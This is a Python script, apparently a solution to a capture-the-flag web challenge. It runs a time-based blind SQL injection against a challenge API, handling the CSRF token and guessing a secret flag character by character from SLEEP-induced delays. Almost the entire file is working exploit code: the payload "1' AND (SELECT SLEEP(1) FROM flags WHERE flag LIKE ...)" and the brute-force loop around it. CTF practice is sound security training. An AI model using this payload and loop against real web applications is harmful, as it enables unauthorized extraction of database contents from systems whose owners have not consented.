import requests
import string
import time

class Inj:
    
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token
    
    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']
    
    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

inj=Inj('http://web-17.challs.olicyber.it')

"""
table_secret
col:asecret
"""

flag='flag{'

while flag[len(flag)-1] != '}':
    for c in string.ascii_letters +string.digits+"_}{":
        start_time=time.time()
        res,err=inj.time(f"1' AND (SELECT SLEEP(1) FROM flags WHERE flag LIKE '{flag}{c}%')='1")
        end_time=time.time()
        if end_time-start_time>0.75:
            flag+=c
            print("running flag:",flag)
            break
        time.sleep(0.1)
print(flag)
